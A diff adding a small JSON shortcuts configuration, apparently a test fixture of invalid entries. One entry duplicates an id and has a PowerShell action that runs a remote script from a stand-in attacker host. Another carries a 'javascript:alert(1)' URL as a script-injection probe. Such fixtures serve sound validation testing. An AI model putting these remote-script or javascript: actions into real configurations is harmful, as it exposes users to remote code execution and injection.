@@ -1,0 +1,32 @@
+{
+  "shortcuts": [
+    {
+      "id": "screenshot",
+      "name": "Screenshot",
+      "icon": "camera",
+      "action": {
+        "type": "hotkey",
+        "keys": ["WIN", "WIN", "S"]
+      }
+    },
+    {
+      "id": "screenshot",
+      "name": "Duplicate",
+      "icon": "camera",
+      "action": {
+        "type": "powershell",
+        "scriptPath": "https://attacker.local/run.ps1",
+        "arguments": []
+      }
+    },
+    {
+      "id": "bad id",
+      "name": "Bad",
+      "icon": "bad",
+      "action": {
+        "type": "url",
+        "url": "javascript:alert(1)"
+      }
+    }
+  ]
+}
